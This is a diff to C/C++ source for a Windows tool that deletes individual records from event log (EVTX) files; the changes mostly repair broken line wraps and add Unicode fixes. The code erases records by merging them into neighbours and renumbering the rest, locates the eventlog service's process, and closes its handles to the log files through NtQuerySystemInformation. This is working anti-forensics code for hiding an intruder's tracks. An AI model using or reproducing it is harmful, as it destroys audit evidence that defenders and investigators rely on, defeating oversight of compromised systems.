@@ -1,3 +1,6 @@
+#define UNICODE
+#include <stdarg.h>
+#include <stdio.h>
 #include <windows.h>
 #include <process.h>
 #pragma comment(lib,"Advapi32.lib") 
@@ -396,9 +399,7 @@ ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 						{
 							if (deleted)
 							{
-								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, 
-
-eventRecordIdentifier - 1);
+								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, eventRecordIdentifier - 1);
 							}
 						}
 						else
@@ -421,29 +422,21 @@ eventRecordIdentifier - 1);
 							{
 								ULONG TempprevRecordPtrSize = prevRecordPtr->Size;
 								prevRecordPtr->Size += currentRecordPtr->Size;
-								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr-
-
->Size;
+								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr->Size;
 								memset(currentRecordPtr, 0, currentRecordPtr->Size - 4);
 								deleted = TRUE;
 								result = SUCCESSED;
 								currentRecordPtr = prevRecordPtr;
 								if (currentChunk->LastEventRecordIdentifier == recordNumber)
 								{
-									currentChunk->LastEventRecordDataOffset = currentChunk-
-
->LastEventRecordDataOffset - TempprevRecordPtrSize;
+									currentChunk->LastEventRecordDataOffset = currentChunk->LastEventRecordDataOffset - TempprevRecordPtrSize;
 								}
 							}
 							else
 							{
 								PBYTE xmlDataPtr = (PBYTE)currentRecordPtr + 24;
-								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr
-
-((PBYTE)currentRecordPtr);
-								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)
-
-nextRecordPtr);
+								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)currentRecordPtr);
+								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)nextRecordPtr);
 								*(PULONG)xmlDataPtr = 0x1010f;
 								*(PWORD)(xmlDataPtr + 4) = 0x10c;
 								if (currentRecordTemplateInstancePtr)
@@ -451,66 +444,36 @@ nextRecordPtr);
 									if (nextRecordPtr)
 									{
 										ULONG a3 = 0;
-										PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr
-
-((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
+										PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
 										if (templateIdentifierPtr)
 										{
-											PBYTE templateDefinition = (PBYTE)
-
-GetTemplateDefinition((PBYTE)currentChunk, currentRecordPtr, currentRecordTemplateInstancePtr);
-											*(PULONG)(templateDefinition + 16) = 
-
-templateIdentifierPtr - templateDefinition - 24;
+											PBYTE templateDefinition = (PBYTE)GetTemplateDefinition((PBYTE)currentChunk, currentRecordPtr, currentRecordTemplateInstancePtr);
+											*(PULONG)(templateDefinition + 16) = templateIdentifierPtr - templateDefinition - 24;
 											currentRecordPtr->Size += nextRecordPtr->Size;
-											*(PULONG)(currentRecordPtr->Size + (PBYTE)
-
-currentRecordPtr - 4) = currentRecordPtr->Size;
-											currentRecordPtr->WrittenDateAndTime = nextRecordPtr-
-
->WrittenDateAndTime;
-											*(PULONG)(currentRecordTemplateInstancePtr + 10) = *
-
-(PULONG)(nextRecordTemplateInstancePtr + 10);
-											ModifyRecordNumber((PBYTE)currentChunk, 
-
-currentRecordPtr, recordNumber);
-											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, 
-
-recordNumber);
+											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
+											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
+											*(PULONG)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
+											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
+											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
 											deleted = TRUE;
 											result = SUCCESSED;
 										}
 										else
 										{
-											ModifyRecordNumber((PBYTE)currentChunk, 
-
-currentRecordPtr, recordNumber);
-											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, 
-
-recordNumber);
-											currentRecordPtr->WrittenDateAndTime = nextRecordPtr-
-
->WrittenDateAndTime;
-											*(PULONG64)(currentRecordTemplateInstancePtr + 10) = 
-
-*(PULONG)(nextRecordTemplateInstancePtr + 10);
+											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
+											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
+											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
+											*(PULONG64)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
 											*xmlDataPtr = 11;
 											*(PWORD)(xmlDataPtr + 1) = 0;
 											*(xmlDataPtr + 3) = 11;
-											*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)
-
-nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
+											*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
 											currentRecordPtr->Size += nextRecordPtr->Size;
-											*(PULONG)(currentRecordPtr->Size + (PBYTE)
-
-currentRecordPtr - 4) = currentRecordPtr->Size;
+											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
 											deleted = TRUE;
 											result = SUCCESSED;
 										}
-										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + 
-
-currentRecordPtr->Size);
+										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + currentRecordPtr->Size);
 									}
 								}
 							}
@@ -571,9 +534,7 @@ currentRecordPtr->Size);
 						tmp -= numberOfChunk;
 					nextChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
 				}
-				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber && 0xffffffffffffffff == currentChunkPtr-
-
->LastEventRecordIdentifier)
+				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber && 0xffffffffffffffff == currentChunkPtr->LastEventRecordIdentifier)
 				{
 					if (nextChunkPtr)
 					{
@@ -627,10 +588,8 @@ DWORD  getpid2()
 		DWORD pcbBytesNeeded;
 		DWORD servicesReturned;
 		LPDWORD lpResumeHandle = NULL;
-		LPCSTR pszGroupName = NULL;
-		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, 
-
-&servicesReturned, lpResumeHandle, pszGroupName);
+		LPCWSTR pszGroupName = NULL;
+		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
 		cbBufSize = pcbBytesNeeded;
 		lpServices = new BYTE[cbBufSize];
 		if (NULL == lpServices)
@@ -639,14 +598,12 @@ DWORD  getpid2()
 		}
 		else
 		{
-			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, 
-
-&servicesReturned, lpResumeHandle, pszGroupName);
+			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
 			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
 			for (DWORD i = 0; i < servicesReturned; i++)
 			{
-				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
-				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
+				_strlwr_s((char *)lpServiceStatusProcess[i].lpServiceName, strlen((const char *)lpServiceStatusProcess[i].lpServiceName) + 1);
+				if (strstr((char *)lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
 				{
 					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
 					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
@@ -703,9 +660,7 @@ BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
 	DWORD ErrorPID = 0;
 	SYSTEM_HANDLE handle = { 0 };
 
-	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), 
-
-"NtQuerySystemInformation");
+	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
 	if (!NtQuerySystemInformation)
 	{
 		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
